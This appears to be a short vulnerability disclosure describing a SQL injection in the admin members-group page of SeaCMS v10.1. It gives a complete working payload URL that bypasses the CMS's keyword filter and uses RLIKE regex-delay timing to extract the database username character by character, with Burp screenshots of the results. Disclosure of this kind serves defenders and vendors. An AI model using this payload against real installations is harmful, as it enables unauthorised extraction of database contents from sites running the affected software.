# Seacms v10.1 (2020.02.08) latest version SQL injection

Download address on official website: https://www.seacms.net

Through code audit, the vulnerability points are`/5owghc/admin_members_group.php`

Note: after the program is installed, the background directory will be renamed randomly. Here it is changed to `5oghc`

![image-20200227163641920](./img/image-20200227163641920.png)

Line 55 variable $id spliced into SQL query，Follow up GetOne function，Using checksql function to filter the key words of SQL injection for variables，Can be bypassed。Use regular `DOS` RLIKE injection。Principle, using SQL to calculate the regular consumption of computing resources multiple times to produce a delay effect

**Payload**

```
http://10.2.7.9/5owghc/admin_members_group.php?action=edit&id=2%20and%20if(mid(user(),1,1)=%27r%27,concat(rpad(1,999999,%27a%27),rpad(1,999999,%27a%27),rpad(1,999999,%27a%27),rpad(1,999999,%27a%27),rpad(1,999999,%27a%27),rpad(1,999999,%27a%27),rpad(1,999999,%27a%27),rpad(1,999999,%27a%27),rpad(1,999999,%27a%27),rpad(1,999999,%27a%27),rpad(1,999999,%27a%27),rpad(1,999999,%27a%27),rpad(1,999999,%27a%27),rpad(1,999999,%27a%27),rpad(1,999999,%27a%27),rpad(1,999999,%27a%27))%20RLIKE%20%27(a.*)%2b(a.*)%2b(a.*)%2b(a.*)%2b(a.*)%2b(a.*)%2b(a.*)%2bcd%27,1)
```

Use burp to get the current database username.

![image-20200303163844971](./img/image-20200303163844971.png)

![image-20200303202558466](./img/image-20200303202558466.png)

Use burp to get the current database name.![image-20200303200750635](./img/image-20200303200750635.png)

So there is a SQL injection vulnerability